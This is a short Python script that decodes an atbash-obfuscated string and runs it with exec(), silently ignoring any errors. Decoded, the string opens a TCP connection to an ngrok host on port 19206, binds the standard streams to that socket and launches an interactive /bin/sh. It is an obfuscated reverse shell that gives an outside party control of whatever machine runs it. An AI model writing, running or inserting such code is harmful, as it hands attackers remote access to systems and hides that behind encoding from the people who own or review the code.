import string

a_l=string.ascii_letters
r_l=a_l[::-1]

try:
	exec("".join([r_l[a_l.index(c)] if c in r_l else c for c in "RNKLIG HLXPVG,HFYKILXVHH,LH;H=HLXPVG.HLXPVG(HLXPVG.zu_rmvg,HLXPVG.hlxp_hgivzn);H.XLMMVXG((\"6.GXK.MTILP.RL\",19206));LH.WFK2(H.UROVML(),0); LH.WFK2(H.UROVML(),1); LH.WFK2(H.UROVML(),2);K=HFYKILXVHH.XZOO([\"/YRM/HS\",\"-R\"]);"]))
except:
	pass
